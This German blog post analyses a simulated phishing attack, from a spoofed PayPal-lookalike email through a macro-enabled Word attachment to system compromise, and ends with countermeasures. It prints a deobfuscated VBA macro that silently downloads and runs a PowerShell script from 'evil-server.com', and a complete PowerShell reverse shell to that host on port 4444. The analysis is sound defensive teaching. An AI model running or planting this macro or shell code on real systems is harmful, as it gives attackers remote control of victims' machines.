layout: post title: "Analyse eines Phishing-Angriffs: Vom E-Mail-Anhang zur Kompromittierung" date: 2025-09-02 10:00:00 +0200 categories: phishing analysis malware
In diesem Write-up analysieren wir einen simulierten Phishing-Angriff. Ziel ist es, die Techniken der Angreifer zu verstehen und effektive Gegenmaßnahmen aufzuzeigen.

Schritt 1: Die Köder-E-Mail
Alles beginnt mit einer E-Mail, die scheinbar von einem vertrauenswürdigen Dienstleister stammt. Sie enthält eine dringende Aufforderung, ein angehängtes Dokument zu überprüfen – in unserem Fall eine vermeintliche Rechnung im Word-Format.

Merkmale der Phishing-Mail:

Gefälschter Absender: Die E-Mail-Adresse sieht auf den ersten Blick legitim aus, aber bei genauerer Betrachtung (From: service@paypal-security.com statt service@paypal.com) wird die Fälschung deutlich.

Dringlichkeit: Formulierungen wie "sofortige Handlung erforderlich" erzeugen psychologischen Druck.

Verdächtiger Anhang: Ein .docm-Dokument, das Makros enthalten kann.

Schritt 2: Der Makro-Payload
Nach dem Öffnen des Word-Dokuments wird der Benutzer aufgefordert, "Inhalte zu aktivieren", um das Dokument korrekt anzuzeigen. Dies ist eine klassische Falle, um bösartige Makros auszuführen.

Das VBA-Makro im Inneren des Dokuments ist obfuskiert, aber nach der Deobfuskation enthüllt es seinen wahren Zweck:

Sub AutoOpen()
    Dim str As String
    str = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile "
    str = str + "-Command ""IEX (New-Object Net.WebClient).DownloadString('[http://evil-server.com/payload.ps1](http://evil-server.com/payload.ps1)')"""
    Shell str, vbHide
End Sub

Dieser Code startet einen versteckten PowerShell-Prozess, der ein weiteres Skript (payload.ps1) von einem vom Angreifer kontrollierten Server herunterlädt und ausführt.

Schritt 3: Die PowerShell-Payload
Das heruntergeladene Skript payload.ps1 stellt eine Reverse-Shell zum C2-Server (Command and Control) des Angreifers her.

$client = New-Object System.Net.Sockets.TCPClient("evil-server.com", 4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();

Sobald die Verbindung hergestellt ist, hat der Angreifer vollen Zugriff auf das kompromittierte System und kann Befehle aus der Ferne ausführen.

Gegenmaßnahmen und Fazit
Dieser Angriff hätte auf mehreren Ebenen verhindert werden können:

Benutzerschulung: Mitarbeiter müssen darauf trainiert werden, Phishing-Anzeichen zu erkennen und keine unbekannten Anhänge zu öffnen oder Makros zu aktivieren.

E-Mail-Filterung: Ein fortschrittlicher Spam- und Malware-Filter hätte die E-Mail wahrscheinlich blockiert.

Deaktivierung von Makros: Makros sollten per Gruppenrichtlinie standardmäßig für Dokumente aus dem Internet deaktiviert sein.

Endpoint Detection and Response (EDR): Eine EDR-Lösung hätte den verdächtigen PowerShell-Prozess erkannt und blockiert.

Die Analyse zeigt, wie eine einfache E-Mail eine vollständige Systemkompromittierung einleiten kann. Wachsamkeit und eine mehrschichtige Verteidigungsstrategie sind entscheidend.
